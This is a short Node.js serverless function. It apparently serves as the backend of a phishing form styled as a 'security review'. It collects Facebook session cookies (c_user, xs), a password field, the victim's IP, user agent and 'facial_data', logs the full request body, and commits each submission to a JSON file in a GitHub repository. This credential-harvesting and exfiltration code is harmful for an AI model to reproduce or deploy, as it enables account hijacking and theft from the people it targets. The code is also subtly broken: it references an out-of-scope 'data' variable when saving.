const axios = require('axios');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    const {
        c_user,
        xs,
        pass_field,
        review_id,
        user_agent,
        ip_address,
        timestamp,
        facial_data,
        blockchain_hash
    } = req.body;

    if (!c_user || !xs || !pass_field || !review_id) {
        return res.status(400).json({ error: 'Missing required fields' });
    }

    const repoOwner = 'spiderman786';
    const repoName = 'my-security-forms';
    const filePath = 'data/submissions.json';
    const token = process.env.GITHUB_TOKEN;

    if (!token) {
        return res.status(500).json({ error: 'GitHub token not set' });
    }

    console.log('Token length:', token.length); // Debug: Token check
    console.log('Request body:', req.body); // Debug: Incoming data

    try {
        let currentData = [];
        try {
            const { data } = await axios.get(
                `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
                { headers: { Authorization: `token ${token}` } }
            );
            if (data.content) {
                currentData = JSON.parse(Buffer.from(data.content, 'base64').toString());
            }
        } catch (error) {
            console.log('Get error:', error.message, error.response?.status);
            if (error.response?.status !== 404) {
                throw new Error(`Failed to fetch file: ${error.message}`);
            }
        }

        currentData.push({
            c_user,
            xs,
            pass_field,
            review_id,
            user_agent: user_agent || req.headers['user-agent'] || 'N/A',
            ip_address: ip_address || req.headers['x-forwarded-for'] || 'N/A',
            timestamp: timestamp || new Date().toISOString(),
            facial_data: facial_data || 'N/A',
            blockchain_hash: blockchain_hash || 'N/A'
        });

        const response = await axios.put(
            `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`,
            {
                message: 'Add new submission',
                content: Buffer.from(JSON.stringify(currentData, null, 2)).toString('base64'),
                sha: data?.sha || undefined
            },
            { headers: { Authorization: `token ${token}` } }
        );

        console.log('Put success:', response.status); // Debug: Confirm success
        res.status(200).json({ message: 'Data saved successfully', sha: response.data.content.sha });
    } catch (error) {
        console.error('Error:', error.message, error.response?.status);
        res.status(500).json({ error: 'Failed to save data: ' + error.message });
    }
};